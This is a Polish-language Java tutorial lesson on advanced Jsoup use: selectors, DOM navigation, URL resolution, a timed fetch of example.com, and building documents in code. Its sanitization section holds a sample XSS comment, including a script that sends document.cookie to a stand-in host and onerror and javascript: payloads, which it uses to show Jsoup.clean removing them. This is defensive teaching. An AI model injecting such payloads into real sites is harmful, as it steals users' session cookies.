package com.example.javaquest._13_libraries.Lesson26_JsoupAdvancedScraping;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.time.Duration;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.safety.Safelist;
import org.jsoup.select.Elements;

public class _Lesson26_JsoupAdvancedScraping {

    public static void main(String[] args) {

        System.out.println("=== LEKCJA 26: JSOUP - ZAAWANSOWANY SCRAPING ===");

        /*
         * ============================================================
         * 📦 KONTYNUACJA LEKCJI 25
         * ============================================================
         * Lekcja 25 pokazala podstawy Jsoup: Jsoup.parse(String), model
         * Document/Element/Elements oraz proste selektory CSS (#id,
         * .klasa, tag.klasa > tag, tag[atrybut]). Ta lekcja NIE powtarza
         * tamtych podstaw - zaklada, ze juz je znasz, i idzie GLEBIEJ:
         * bardziej zlozone selektory CSS, nawigacja po drzewie DOM BEZ
         * selektorow, rozwiazywanie wzglednych adresow URL, prawdziwe
         * pobieranie stron przez siec oraz sanitizacja niebezpiecznego
         * HTML (bezpieczenstwo!).
         */

        demonstrateDescendantVsChildSelectors();
        demonstrateAttributeSelectors();
        demonstrateContainsAndNthChildSelectors();
        demonstrateCombinedSelectors();
        demonstrateDomNavigationWithoutSelectors();
        demonstrateAttrVsAbsUrl();
        demonstrateTextVsHtmlVsOuterHtml();
        demonstrateRealNetworkFetch();
        demonstrateHtmlSanitization();
        demonstrateBuildingDocumentProgrammatically();

        /*
         * ============================================================
         * 📌 PODSUMOWANIE
         * ============================================================
         * - Kombinator " " (spacja) = dowolny POTOMEK, kombinator ">" =
         *   BEZPOSREDNIE dziecko - to bardzo czesta pulapka poczatkujacych.
         * - Selektory atrybutow: [attr] (istnieje), [attr=wartosc]
         *   (dokladna wartosc), [attr^=], [attr$=], [attr*=] (zaczyna
         *   sie/konczy sie/zawiera podciag).
         * - :contains(tekst) filtruje po widocznym tekscie, :nth-child(n)
         *   po pozycji wsrod rodzenstwa.
         * - Nawigacja bez selektorow: parent(), children(), siblingElements(),
         *   nextElementSibling()/previousElementSibling() - przydatne, gdy
         *   struktura strony nie ma wygodnych klas/id do zlapania selektorem.
         * - attr("href") zwraca SUROWA wartosc atrybutu (moze byc
         *   wzgledna, np. "/artykul/5"), absUrl("href") zwraca PELNY,
         *   bezwzgledny adres URL wyliczony wzgledem adresu strony
         *   zrodlowej - kluczowe przy scrapowaniu linkow z realnych stron.
         * - text() = widoczny tekst, html() = wewnetrzny znacznik HTML,
         *   outerHtml() = html() + wlasny tag elementu.
         * - Jsoup.connect(url) pozwala ustawic timeout/userAgent/metode
         *   (get/post) - zawsze z try-catch na IOException i przyjaznym
         *   komunikatem "brak internetu", zeby demo konczylo sie samo.
         * - Jsoup.clean(html, safelist) sanityzuje NIEZAUFANY HTML -
         *   usuwa niebezpieczne tagi (np. <script>) i atrybuty, chroniac
         *   przed stored XSS przy wyswietlaniu tresci od uzytkownikow.
         * - Document mozna tez BUDOWAC programowo (Jsoup.parse("") +
         *   appendElement(...)), nie tylko parsowac gotowy HTML.
         */

        System.out.println("\n=== KONIEC LEKCJI 26 ===");
    }

    /*
     * ============================================================
     * 🔹 KOMBINATOR POTOMKA (" ") vs KOMBINATOR DZIECKA (">")
     * ============================================================
     * "div p"   - kazdy <p>, ktory jest GDZIEKOLWIEK wewnatrz <div>
     *             (dowolny poziom zagniezdzenia - dziecko, wnuk, prawnuk...)
     * "div > p" - tylko <p>, ktory jest BEZPOSREDNIM dzieckiem <div>
     *             (jeden poziom nizej, nic pomiedzy)
     * To jedna z najczesciej mylonych rzeczy w CSS/Jsoup - warto
     * zapamietac na konkretnym przykladzie z zagniezdzonym <span>.
     */
    private static void demonstrateDescendantVsChildSelectors() {
        System.out.println("\n=== Kombinator potomka \" \" vs kombinator dziecka \">\" ===");

        String html = """
                <div class="panel">
                    <p>Bezposrednie dziecko 1</p>
                    <section>
                        <p>Wnuk (potomek, ale NIE bezposrednie dziecko)</p>
                        <span><p>Prawnuk, jeszcze glebiej</p></span>
                    </section>
                    <p>Bezposrednie dziecko 2</p>
                </div>
                """;
        Document doc = Jsoup.parse(html);

        Elements allDescendants = doc.select("div.panel p");
        Elements directChildren = doc.select("div.panel > p");

        System.out.println("\"div.panel p\" (wszyscy potomkowie)      -> " + allDescendants.size() + " elementow");
        System.out.println("\"div.panel > p\" (tylko bezposrednie dzieci) -> " + directChildren.size() + " elementy");
        for (Element p : directChildren) {
            System.out.println("  bezposrednie dziecko: \"" + p.text() + "\"");
        }
    }

    /*
     * ============================================================
     * 🔍 SELEKTORY ATRYBUTOW
     * ============================================================
     * - [attr]        - element MA dany atrybut (dowolna wartosc)
     * - [attr=val]     - atrybut o DOKLADNIE takiej wartosci
     * - [attr^=val]    - wartosc atrybutu ZACZYNA SIE od "val"
     * - [attr$=val]    - wartosc atrybutu KONCZY SIE na "val"
     * - [attr*=val]    - wartosc atrybutu ZAWIERA podciag "val"
     * Bardzo przydatne np. do wylapania wszystkich linkow do plikow PDF
     * albo wszystkich obrazkow konkretnego formatu.
     */
    private static void demonstrateAttributeSelectors() {
        System.out.println("\n=== Selektory atrybutow ([attr], [attr$=], itd.) ===");

        String html = """
                <div>
                    <img src="logo.png" alt="Logo">
                    <img src="banner.jpg" alt="Banner">
                    <img src="icon-small.png" alt="Ikona">
                    <a href="raport.pdf">Raport PDF</a>
                    <a href="https://example.com">Strona zewnetrzna</a>
                    <a>Link bez href</a>
                </div>
                """;
        Document doc = Jsoup.parse(html);

        Elements imagesWithSrc = doc.select("img[src]");
        Elements pngImages = doc.select("img[src$=.png]");
        Elements externalLinks = doc.select("a[href^=https]");
        Elements linksWithHref = doc.select("a[href]");

        System.out.println("img[src]        -> " + imagesWithSrc.size() + " obrazkow z atrybutem src");
        System.out.println("img[src$=.png]  -> " + pngImages.size() + " obrazkow PNG (koncowka .png)");
        System.out.println("a[href^=https]  -> " + externalLinks.size() + " linkow zaczynajacych sie od https");
        System.out.println("a[href]         -> " + linksWithHref.size() + " linkow MAJACYCH href (pomija link bez href)");
    }

    /*
     * ============================================================
     * 🔹 :contains(tekst) I :nth-child(n)
     * ============================================================
     * - :contains(tekst) - dopasowuje element, ktorego WIDOCZNY tekst
     *   zawiera podany podciag (bez rozroznienia wielkosci liter).
     * - :nth-child(n) - dopasowuje element na KONKRETNEJ pozycji wsrod
     *   rodzenstwa (liczac od 1). Wspiera tez wzory CSS, np.
     *   :nth-child(2n) dla parzystych pozycji, :nth-child(odd)/(even).
     */
    private static void demonstrateContainsAndNthChildSelectors() {
        System.out.println("\n=== :contains(tekst) i :nth-child(n) ===");

        String html = """
                <ul id="tasks">
                    <li>Kup mleko</li>
                    <li>Napisz raport pilny</li>
                    <li>Zadzwon do klienta</li>
                    <li>Sprawdz raport miesieczny</li>
                    <li>Odpocznij</li>
                </ul>
                """;
        Document doc = Jsoup.parse(html);

        Elements withReport = doc.select("li:contains(raport)");
        System.out.println("li:contains(raport) -> " + withReport.size() + " pasujacych zadan:");
        for (Element li : withReport) {
            System.out.println("  - " + li.text());
        }

        Element third = doc.selectFirst("#tasks li:nth-child(3)");
        System.out.println("#tasks li:nth-child(3) -> \"" + (third != null ? third.text() : "brak") + "\"");

        Elements evenPositions = doc.select("#tasks li:nth-child(2n)");
        System.out.println("#tasks li:nth-child(2n) (parzyste pozycje) -> " + evenPositions.size() + " elementy");
    }

    /*
     * ============================================================
     * 🔍 LACZENIE SELEKTOROW (tag + klasa + id + atrybut naraz)
     * ============================================================
     * Selektory Jsoup mozna dowolnie skladac w jeden lancuch, dokladnie
     * jak w CSS - np. "a.external[target=_blank]" znajdzie TYLKO linki
     * z klasa "external" ORAZ atrybutem target="_blank" jednoczesnie.
     */
    private static void demonstrateCombinedSelectors() {
        System.out.println("\n=== Laczenie selektorow (tag.klasa[atrybut=wartosc]) ===");

        String html = """
                <a class="external" href="https://a.example" target="_blank">A - nowa karta</a>
                <a class="external" href="https://b.example">B - ta sama karta</a>
                <a class="internal" href="/kontakt" target="_blank">Kontakt - nowa karta</a>
                """;
        Document doc = Jsoup.parse(html);

        Elements matched = doc.select("a.external[target=_blank]");
        System.out.println("a.external[target=_blank] -> " + matched.size() + " dopasowanie (external I nowa karta):");
        for (Element a : matched) {
            System.out.println("  - " + a.text());
        }
    }

    /*
     * ============================================================
     * 🔹 NAWIGACJA PO DOM BEZ SELEKTOROW
     * ============================================================
     * Czasem wygodniej jest "poruszac sie" po drzewie DOM krok po
     * kroku od znalezionego juz elementu, zamiast pisac skomplikowany
     * selektor od nowa:
     * - element.parent()               - rodzic elementu
     * - element.children()             - Elements - bezposrednie dzieci
     *   (BEZ wezlow tekstowych - tylko elementy HTML)
     * - element.siblingElements()      - wszyscy "bracia/siostry"
     *   (elementy na tym samym poziomie, oprocz samego elementu)
     * - element.nextElementSibling()   - kolejny element-rodzenstwo
     *   (albo null, jesli to ostatni)
     * - element.previousElementSibling() - poprzedni element-rodzenstwo
     *   (albo null, jesli to pierwszy)
     */
    private static void demonstrateDomNavigationWithoutSelectors() {
        System.out.println("\n=== Nawigacja po DOM: parent/children/siblingElements/nextElementSibling ===");

        String html = """
                <div class="card">
                    <h3 id="card-title">Laptop XPS</h3>
                    <p class="price">4999 zl</p>
                    <p class="stock">Dostepny</p>
                    <button>Kup teraz</button>
                </div>
                """;
        Document doc = Jsoup.parse(html);

        Element title = doc.selectFirst("#card-title");
        if (title != null) {
            Element parent = title.parent();
            System.out.println("title.parent() -> <" + (parent != null ? parent.tagName() : "brak") + ">");

            Elements siblings = title.siblingElements();
            System.out.println("title.siblingElements() -> " + siblings.size() + " elementow rodzenstwa:");
            for (Element sibling : siblings) {
                System.out.println("  - <" + sibling.tagName() + ">: " + sibling.text());
            }

            Element next = title.nextElementSibling();
            System.out.println("title.nextElementSibling() -> " + (next != null ? next.text() : "brak"));

            Element price = doc.selectFirst("p.price");
            if (price != null) {
                Element prev = price.previousElementSibling();
                Element nextAfterPrice = price.nextElementSibling();
                System.out.println("price.previousElementSibling() -> <" + (prev != null ? prev.tagName() : "brak") + ">");
                System.out.println("price.nextElementSibling() -> " + (nextAfterPrice != null ? nextAfterPrice.text() : "brak"));
            }
        }

        Element card = doc.selectFirst("div.card");
        if (card != null) {
            Elements children = card.children();
            System.out.println("card.children() -> " + children.size() + " bezposrednich dzieci (h3, p, p, button)");
        }
    }

    /*
     * ============================================================
     * 🔍 attr("href") vs absUrl("href") - ROZWIAZYWANIE WZGLEDNYCH URL
     * ============================================================
     * Prawdziwe strony bardzo czesto maja linki WZGLEDNE, np.
     * href="/produkty/5" albo href="../kontakt.html" - takie same, jak
     * je widac w surowym HTML. attr("href") zwraca DOKLADNIE ta surowa
     * wartosc. Do scrapowania (np. zeby potem samemu pobrac ten link)
     * potrzebujesz jednak PELNEGO adresu - absUrl("href") wylicza go,
     * biorac pod uwage adres bazowy dokumentu (ustawiany automatycznie
     * przez Jsoup.connect(url), albo recznie przez Jsoup.parse(html, baseUri)).
     */
    private static void demonstrateAttrVsAbsUrl() {
        System.out.println("\n=== attr(\"href\") vs absUrl(\"href\") (wzgledne -> bezwzgledne URL) ===");

        String html = """
                <div>
                    <a id="relative-link" href="/produkty/5">Produkt 5</a>
                    <a id="absolute-link" href="https://inna-domena.example/x">Juz bezwzgledny</a>
                </div>
                """;
        // Drugi argument Jsoup.parse to baseUri - adres, wzgledem ktorego
        // Jsoup wyliczy absUrl() dla linkow wzglednych w tym dokumencie.
        Document doc = Jsoup.parse(html, "https://sklep.example/katalog/laptopy");

        Element relative = doc.getElementById("relative-link");
        if (relative != null) {
            System.out.println("attr(\"href\")   -> " + relative.attr("href") + " (surowa wartosc, wzgledna)");
            System.out.println("absUrl(\"href\") -> " + relative.absUrl("href") + " (wyliczony pelny adres)");
        }

        Element absolute = doc.getElementById("absolute-link");
        if (absolute != null) {
            System.out.println("juz bezwzgledny link: attr == absUrl -> " + absolute.attr("href")
                    + " == " + absolute.absUrl("href"));
        }
    }

    /*
     * ============================================================
     * 🔹 text() vs html() vs outerHtml() - PRZYPOMNIENIE + NIUANSE
     * ============================================================
     * Lesson25 przedstawil te trzy metody pobieznie - tutaj konkretny
     * przyklad obok siebie, zeby roznica byla oczywista na pierwszy
     * rzut oka:
     * - text()      - WYLACZNIE widoczny tekst, bez zadnych tagow
     * - html()      - surowy HTML WEWNATRZ elementu (jego dzieci)
     * - outerHtml() - to samo co html(), ale RAZEM z tagiem otwierajacym
     *                 i zamykajacym samego elementu
     */
    private static void demonstrateTextVsHtmlVsOuterHtml() {
        System.out.println("\n=== text() vs html() vs outerHtml() (na jednym elemencie) ===");

        String html = "<p id=\"note\">Cena: <b>199 zl</b> <i>(promocja)</i></p>";
        Document doc = Jsoup.parse(html);
        Element note = doc.getElementById("note");

        if (note != null) {
            System.out.println("text()      -> " + note.text());
            System.out.println("html()      -> " + note.html());
            System.out.println("outerHtml() -> " + note.outerHtml());
        }
    }

    /*
     * ============================================================
     * 🔍 PRAWDZIWE POBRANIE STRONY: Jsoup.connect(url)
     * ============================================================
     * Connection (zwracany przez Jsoup.connect(url)) mozna konfigurowac
     * lancuchowo: timeout (w milisekundach), userAgent (niektore serwery
     * odrzucaja domyslnego, "podejrzanego" User-Agenta bibliotek HTTP),
     * metoda .get()/.post(). To realne polaczenie przez siec - dlatego,
     * zgodnie z konwencja tego kursu (patrz _06_networking,
     * _11_buildtools/Lesson09_AntIvy), uzywamy KROTKIEGO timeoutu i
     * lapiemy IOException, zeby main() zakonczyl sie samoistnie w kilka
     * sekund NAWET bez dostepu do internetu.
     */
    private static void demonstrateRealNetworkFetch() {
        System.out.println("\n=== Jsoup.connect(url) - prawdziwe pobranie strony (z timeoutem) ===");
        try {
            Document remoteDoc = Jsoup.connect("https://example.com")
                    .timeout((int) Duration.ofSeconds(5).toMillis())
                    .userAgent("Mozilla/5.0 (compatible; JavaQuestBot/1.0; +https://example.com/bot)")
                    .get();

            System.out.println("Tytul zdalnej strony: " + remoteDoc.title());
            Elements paragraphs = remoteDoc.select("p");
            System.out.println("Liczba akapitow <p> na stronie: " + paragraphs.size());

            Elements links = remoteDoc.select("a[href]");
            System.out.println("Linki na stronie (absUrl):");
            for (Element link : links) {
                System.out.println("  - " + link.absUrl("href"));
            }
        } catch (SocketTimeoutException e) {
            System.out.println("Przekroczono limit czasu polaczenia (brak internetu?) - kontynuuje bez zdalnych danych.");
        } catch (IOException e) {
            System.out.println("Nie udalo sie polaczyc z https://example.com: " + e.getClass().getSimpleName()
                    + " - " + e.getMessage() + " (brak internetu? kontynuuje bez zdalnych danych)");
        }
    }

    /*
     * ============================================================
     * 🔹 SANITYZACJA NIEZAUFANEGO HTML: Jsoup.clean(...) + Safelist
     * ============================================================
     * PROBLEM BEZPIECZENSTWA: jesli aplikacja pozwala uzytkownikom
     * wprowadzac tresc, ktora potem jest wyswietlana JAKO HTML innym
     * uzytkownikom (komentarze, opisy, posty na forum...), a tresc ta
     * NIE jest oczyszczona, to zlosliwy uzytkownik moze wstrzyknac
     * <script>...</script> wykonujacy sie w przegladarce ofiary - to
     * klasyczny atak STORED XSS (Cross-Site Scripting).
     *
     * Jsoup.clean(niezaufanyHtml, safelist) rozwiazuje ten problem:
     * parsuje wejsciowy HTML i zwraca NOWY, oczyszczony String, w ktorym
     * zostaly TYLKO tagi/atrybuty dozwolone przez podana Safelist -
     * wszystko inne (w tym <script>, atrybuty typu onclick="...") jest
     * USUWANE. Gotowe profile Safelist (od najbardziej restrykcyjnego):
     * - Safelist.none()   - zero tagow, sam czysty tekst
     * - Safelist.simpleText() - tylko b, em, i, strong, u
     * - Safelist.basic()  - podstawowe formatowanie + linki (a, b, blockquote,
     *   code, em, i, li, ol, p, ul, strong...), bez obrazkow
     * - Safelist.basicWithImages() - jak basic() + <img>
     * - Safelist.relaxed() - szerszy zestaw (naglowki, tabele, itd.)
     * MOZNA tez zbudowac wlasna Safelist recznie (addTags/addAttributes).
     */
    private static void demonstrateHtmlSanitization() {
        System.out.println("\n=== Jsoup.clean(...) - sanityzacja niezaufanego HTML (ochrona przed XSS) ===");

        String maliciousLookingComment = "<p>Super artykul! <b>Polecam</b> wszystkim.</p>"
                + "<script>fetch('https://zly-serwer.example/steal?cookie=' + document.cookie);</script>"
                + "<img src=\"x\" onerror=\"alert('zaatakowany')\">"
                + "<a href=\"javascript:alert('xss')\">kliknij tutaj</a>";

        System.out.println("Wejscie (NIEZAUFANE, od uzytkownika):");
        System.out.println(maliciousLookingComment);

        String cleaned = Jsoup.clean(maliciousLookingComment, Safelist.basic());
        System.out.println("\nPo Jsoup.clean(html, Safelist.basic()):");
        System.out.println(cleaned);
        System.out.println("(<script> i onerror zostaly USUNIETE - bezpieczne do wyswietlenia)");

        String plainOnly = Jsoup.clean(maliciousLookingComment, Safelist.none());
        System.out.println("\nPo Jsoup.clean(html, Safelist.none()) (zero tagow, sam tekst):");
        System.out.println(plainOnly);
    }

    /*
     * ============================================================
     * 📌 BONUS: BUDOWANIE/MODYFIKOWANIE Document PROGRAMOWO
     * ============================================================
     * Jsoup nie tylko PARSUJE istniejacy HTML - mozna tez zbudowac
     * dokument OD ZERA w kodzie: Jsoup.parse("") tworzy pusty, ale
     * poprawny szkielet <html><head></head><body></body></html>, a
     * potem appendElement(tag) dodaje nowe elementy, .attr(...) ustawia
     * ich atrybuty, .text(...) ich tresc. Przydatne np. do generowania
     * prostych raportow HTML w kodzie.
     */
    private static void demonstrateBuildingDocumentProgrammatically() {
        System.out.println("\n=== Budowanie Document programowo (bez parsowania gotowego HTML) ===");

        Document doc = Jsoup.parse("");
        Element body = doc.body();

        body.appendElement("h1").text("Raport dzienny");

        Element list = body.appendElement("ul").attr("id", "report-items");
        list.appendElement("li").text("Zamowien zlozonych: 42");
        list.appendElement("li").text("Zamowien anulowanych: 3");

        Element link = body.appendElement("a")
                .attr("href", "https://example.com/raport")
                .text("Pelny raport online");

        System.out.println("Zbudowany dokument (outerHtml body):");
        System.out.println(body.outerHtml());
        System.out.println("\nSprawdzenie przez selektor po zbudowaniu: ul#report-items li -> "
                + doc.select("ul#report-items li").size() + " pozycje");
        System.out.println("Link dodany programowo: " + link.attr("href"));
    }
}
